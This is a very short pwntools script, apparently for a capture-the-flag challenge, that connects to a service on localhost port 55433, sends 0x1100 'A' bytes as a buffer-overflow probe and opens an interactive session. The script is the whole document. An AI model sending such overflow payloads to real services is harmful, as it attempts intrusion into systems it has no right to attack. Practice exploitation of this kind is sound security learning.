from pwn import *

# p = process("./chall")
p = remote("localhost", 55433)

p.sendline(b"A"*0x1100)

p.interactive()
